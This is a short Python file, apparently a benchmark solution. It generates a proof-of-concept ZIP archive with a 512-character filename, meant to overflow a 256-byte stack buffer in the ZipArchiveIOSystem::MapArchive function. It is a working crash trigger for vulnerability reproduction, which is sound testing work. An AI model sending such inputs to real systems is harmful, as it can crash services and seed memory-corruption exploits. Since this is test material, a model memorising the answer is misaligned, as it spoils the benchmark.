import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a stack buffer overflow in ZipArchiveIOSystem::MapArchive.
        # It allocates a fixed-size buffer of 256 bytes on the stack and copies 
        # the filename extracted from the zip file into it without proper bounds checking.
        # To trigger this, we generate a ZIP file containing an entry with a filename
        # significantly longer than 256 bytes (e.g., 512 bytes).
        
        buffer = io.BytesIO()
        
        # Create a ZIP file using ZIP_STORED (no compression) to keep the structure simple.
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
            # Create a filename of 512 characters, which exceeds the 256-byte buffer.
            # This will cause a stack buffer overflow when processed by the vulnerable function.
            long_filename = "A" * 512
            
            # Add a file with this name to the archive. The content is irrelevant.
            zf.writestr(long_filename, b"")
            
        return buffer.getvalue()